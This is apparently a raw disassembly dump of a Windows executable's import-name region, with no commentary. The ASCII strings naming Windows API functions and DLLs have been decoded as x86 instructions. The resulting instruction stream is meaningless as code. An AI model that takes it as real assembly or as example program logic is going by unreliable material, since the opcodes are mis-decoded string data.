  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
